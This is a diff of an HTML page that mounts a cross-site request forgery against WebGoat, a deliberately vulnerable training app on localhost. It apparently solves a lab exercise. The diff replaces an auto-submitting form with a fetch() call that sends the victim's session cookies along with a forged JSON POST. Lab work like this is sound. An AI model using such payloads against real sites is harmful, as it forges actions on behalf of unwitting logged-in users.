@@ -1,17 +1,22 @@
 <!doctype html>
 <html>
   <body>
-    <form id="f"
-          action="http://localhost:8080/WebGoat/csrf/feedback/message"
-          method="POST"
-          enctype="text/plain">
-
-      <textarea name='{"email":"webgoat@webgoat.org","message":"WebGoat is the best!","name":"WebGoat","subject":"service"}'></textarea>
-
-    </form>
+    <h3>Triggering CSRF JSON via fetch(no-cors)...</h3>
 
     <script>
-      document.getElementById('f').submit();
+      const payload = {
+        email: "webgoat@webgoat.org",
+        message: "WebGoat is the best!",
+        name: "WebGoat",
+        subject: "service"
+      };
+
+      fetch("http://localhost:8080/WebGoat/csrf/feedback/message", {
+        method: "POST",
+        mode: "no-cors",          // prevents preflight; request still goes out
+        credentials: "include",   // sends your WebGoat session cookies
+        body: JSON.stringify(payload)
+      });
     </script>
   </body>
 </html>
